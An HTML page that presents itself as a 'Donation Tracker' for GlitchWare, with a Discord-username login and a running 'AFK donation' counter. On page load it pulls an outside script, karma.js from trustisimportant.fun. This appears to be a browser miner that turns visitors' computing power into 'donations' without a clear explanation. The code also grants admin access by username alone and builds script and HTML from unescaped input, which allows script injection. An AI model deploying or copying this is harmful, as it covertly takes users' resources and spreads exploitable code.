<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Donation Tracker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #222;
            color: #fff;
            text-align: center;
            padding: 50px;
        }
        .donation-info {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .time-counter {
            font-size: 20px;
            color: #ccc;
            margin-bottom: 10px;
        }
        .donation-rate {
            font-size: 16px;
            color: #999;
            margin-bottom: 20px;
        }
        .admin-panel {
            margin-top: 20px;
            text-align: left;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
        input {
            padding: 10px;
            font-size: 16px;
            margin-bottom: 10px;
        }
        #login-section, #donation-section, #admin-section {
            display: none;
        }
    </style>
</head>
<body>
    <div id="login-section">
        <input type="text" id="username" placeholder="Enter your Discord username">
        <button onclick="login()">Login</button>
    </div>

    <div id="donation-section">
        <div class="donation-info">Donated amount of money to GlitchWare in this session: $<span id="donation-amount">0.0000000000</span></div>
        <div class="time-counter" id="time-counter">00:00:00</div>
        <div class="donation-rate">Current AFK donation rate: $0.0000000144 per second</div>
    </div>

    <div id="admin-section">
        <div class="admin-panel">
            <h2>Admin Panel</h2>
            <div id="user-donations"></div>
        </div>
    </div>

    <script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
    <script>
        // Default donation rate per second (example)
        const donationRatePerSecond = 0.0000000144;

        // Initialize donation amount and user data
        let donationAmount = parseFloat(getData('donationAmount')) || 0.0;
        let users = JSON.parse(getData('users')) || {};

        // Display login section on page load
        document.getElementById('login-section').style.display = 'block';

        function login() {
            const username = document.getElementById('username').value.trim();
            if (username) {
                document.getElementById('login-section').style.display = 'none';
                if (username === 'admin-xeno1') {
                    document.getElementById('admin-section').style.display = 'block';
                    displayUserDonations();
                } else {
                    document.getElementById('donation-section').style.display = 'block';
                    startDonationTracker(username);
                }
            }
        }

        function startDonationTracker(username) {
            setInterval(() => {
                // Update donation amount
                donationAmount += donationRatePerSecond;
                saveData('donationAmount', donationAmount.toString());
                document.getElementById('donation-amount').innerText = donationAmount.toFixed(10);

                // Update user's donation amount
                if (!users[username]) {
                    users[username] = 0.0;
                }
                users[username] += donationRatePerSecond;
                saveData('users', JSON.stringify(users));

                // Update time counter (example)
                updateTimer();
            }, 1000);
        }

        function updateTimer() {
            // Implement your timer update logic here (example)
            const now = new Date();
            const hours = now.getHours();
            const minutes = now.getMinutes();
            const seconds = now.getSeconds();
            document.getElementById('time-counter').innerText = `${hours}:${minutes}:${seconds}`;
        }

        function displayUserDonations() {
            const userDonationsDiv = document.getElementById('user-donations');
            userDonationsDiv.innerHTML = '';
            for (const user in users) {
                const donation = users[user].toFixed(10);
                userDonationsDiv.innerHTML += `<p>${user}: $${donation}</p>`;
            }
        }

        // Function to save data in the HTML file (not recommended for large datasets or sensitive data)
        function saveData(key, value) {
            const script = document.createElement('script');
            script.textContent = `localStorage.setItem('${key}', '${value}');`;
            document.head.appendChild(script).parentNode.removeChild(script);
        }

        // Function to retrieve data from the HTML file
        function getData(key) {
            return localStorage.getItem(key);
        }
    </script>
</body>
</html>
